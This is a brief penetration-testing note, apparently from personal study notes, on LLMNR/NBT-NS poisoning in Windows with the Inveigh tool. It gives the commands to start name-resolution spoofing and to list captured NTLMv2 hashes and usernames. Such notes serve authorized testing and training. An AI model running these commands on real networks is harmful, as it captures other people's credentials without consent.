# LLMNR/NBT-NS Poisoning -Windows

in windows we will be use tool call **`Inveigh`** which this tool was written by c# and PowerShell

[https://github.com/Kevin-Robertson/Inveigh.git](https://github.com/Kevin-Robertson/Inveigh.git)

```bash
# to run module 
Import-Module .\\Inveigh.ps1

# **LLMNR/NBT-NS spoofing
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y**
```

**Inveigh C# (InveighZero)**

you can use it because more updated

```bash
.\\Inveigh.exe

ESC
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```
